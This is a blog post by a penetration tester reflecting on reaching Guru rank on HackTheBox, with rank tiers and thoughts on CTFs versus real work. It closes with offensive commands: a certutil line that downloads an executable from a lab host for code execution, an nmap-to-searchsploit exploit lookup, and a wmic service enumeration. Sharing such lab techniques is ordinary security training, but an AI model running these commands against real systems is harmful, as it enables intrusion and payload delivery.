---
layout:     post
title:      "HackTheBox (HTB) thoughts as Guru Rank"
#subtitle:   "Pentesting"
date:       2018-08-02
author:     "Tech"
header-img: "img/htb_final_dark.png"
tags:
    - RedTeam
    - Pentesting
    - Programming
    - Linux
---

![](img/htb_final.png)

# HackTheBox (HTB) thoughts as Guru Rank :

Here are my random thoughts on HackTheBox, which will be known as HTB for the rest of the post.

##Background:
I completed the Offensive Security Certified Professional (OSCP) last year spring time. I shortly followed that by getting SecurityTube Linux Assembly Expert (SLAE), which started my prepration for Offensive Security Certified Expert (OSCE). During my SLAE course, I signed up for HTB as every other twitter post was about it. I solved two challenges and never logged back in. A few months go by and after drowning in OSCE prep, I needed a change of paste from living in shellcode all day. Under those circumstance, my official HTB journey began..

---

## Breaking Down HackTheBox

There are 7 ranks depending on completion of active machines and challenges:

- Noob >= 0%
- Script Kiddie > 5%
- Hacker > 20%
- Pro Hacker > 45%
- Elite Hacker > 70%
- Guru > 90% (My Rank)
- Omniscient = 100%

There are only 20 total machines that are active at one time, every week the oldest machine gets dropped and a new one gets added. There are a total of 57 challenges that cover the topics below:

- Reversing
- Crypto
- Stego
- Pwn
- Web
- Misc
- Forensics
- Mobile

---

## Omniscient?!

From start to end, my journey started with Noob rank (as everyone) and in a short three weeks ended with GURU rank. With that, I completed all 20/20 machines and 41 of the 57 challenges. I thought about going for omniscient, 16 challenges would only need to be completed.

I decided to move on from HTB at this point. Calculating my time, experience gain from the 16 left challenges and ROI on real life usefulness... Guru is alright with me.

I'm currently rank 60th place out of 50,000 registered members worldwide (as of JUNE 2018) & 6th Place for United States.

## My thoughts..

There's something that needs to be said, HTB vs the Real-World.

As a OSCP holder and a full time red team / penetration tester, some of the machines and challenges on HTB are out of scope to real life situations. It's awesome to learn new tricks and techniques as someone in the field, but none of this is going to help me on the daily really.

Someone on HTB once said:

> "That being said I wouldn't ever use a person's CTF History as an indicator of skill. It would be used for a willingness to learn outside of work hours which is probably more important."

These are not ALL going to be applicable in the real world but they are important to the creative thinking and other aspects of what pen-testing involves and therefore still worth your time to do them.

##Overall
This field were all in is everlearning. I believe HackTheBox is a great platform for all types of skill levels and even OSCP holders. They have a wide varity of machines for all levels of skill. I personally learn quite a few things and would like to leave some commands here..

```
 cmd.exe /C certutil  -split -urlcache -f http://10.10.10.10/exe.LOL c:\Users\Admin\Desktop\exe.lol
 ```
 -- Getting code execution with certutil (used here to download file)

 ```
 nmap -p- -sV -oX new.xml 10.10.10.10; searchsploit --nmap new.xml
 ```
 -- Checks all results in Nmap's XML output with service version

 ```
 cmd.exe /c wmic service where started=true get name, startname
 ```
 -- List all started services only.
